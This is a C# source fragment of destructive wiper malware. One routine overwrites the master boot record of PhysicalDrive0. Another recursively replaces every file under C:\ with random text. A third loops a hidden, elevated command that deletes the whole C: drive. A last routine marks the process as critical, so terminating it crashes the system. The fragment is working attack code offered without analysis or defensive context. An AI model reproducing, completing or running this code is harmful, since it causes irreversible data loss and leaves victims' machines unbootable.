        public static int BreakOnTermination = 0x1D;
        public static int isCritical = 1;

        public static void overwriteBoot()
        {
            uint dwWrittenBytes;
            IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (drive == INVALID_HANDLE_VALUE)
            {
                MessageBox.Show("What On Earth Happened?! I Failed To Open The Handle.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                CloseHandle(drive);
            }
            if (!WriteFile(drive, mbrData, 512, out dwWrittenBytes, IntPtr.Zero))
            {
                MessageBox.Show("What On Earth Happened?! I Failed To Overwrite The MBR.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                CloseHandle(drive);
            }
            CloseHandle(drive);
        }

        public static void searchFiles(string rootDirectory)
        {
            try
            {
                Random r = new Random();
                string[] files = Directory.GetFiles(rootDirectory);
                foreach (string file in files)
                {
                    try
                    {
                        File.WriteAllText(file, generateLetters(r.Next(1000)));
                    }
                    catch { }
                }
                string[] subdirectories = Directory.GetDirectories(rootDirectory);
                foreach (string subdirectory in subdirectories)
                {
                    searchFiles(subdirectory);
                }
            }
            catch { }
        }

        public static void overwriteFiles()
        {
            while (true)
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "cmd /c /rd /s /q C:\\";
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.CreateNoWindow = true;
                psi.Verb = "RunAs";
                Process.Start(psi);

                Thread.Sleep(1000);
                searchFiles("C:\\");
            }
        }

        public static void setProcessCritical()
        {
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

